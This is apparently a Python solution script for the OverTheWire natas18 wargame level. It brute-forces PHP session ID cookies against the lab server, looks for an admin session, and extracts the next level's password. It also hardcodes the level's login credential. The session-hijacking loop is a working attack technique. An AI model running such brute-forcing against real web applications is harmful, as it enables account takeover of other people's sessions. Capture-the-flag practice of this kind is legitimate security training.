from pwn import *
import requests
import re

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://{}.natas.labs.overthewire.org".format(username)
#characters = ascii_lowercase + ascii_uppercase + digits

log.progress("Getting the natas19 password, Hold on! ")
session = requests.session()

for cookies in range(110, 641):			#You can change it to 0 if you want to do it from beginning
    #print("Trying with the cookie " + str(cookies))
    web = session.post(url , cookies = {"PHPSESSID" : str(cookies)} , auth = (username, password)).text
    #print(session.cookies)
    if "You are an admin" in web:
        statment = re.findall("Password: (.*)</pre><div", web)
        print("The password for natas19 is === " + statment[0])
        break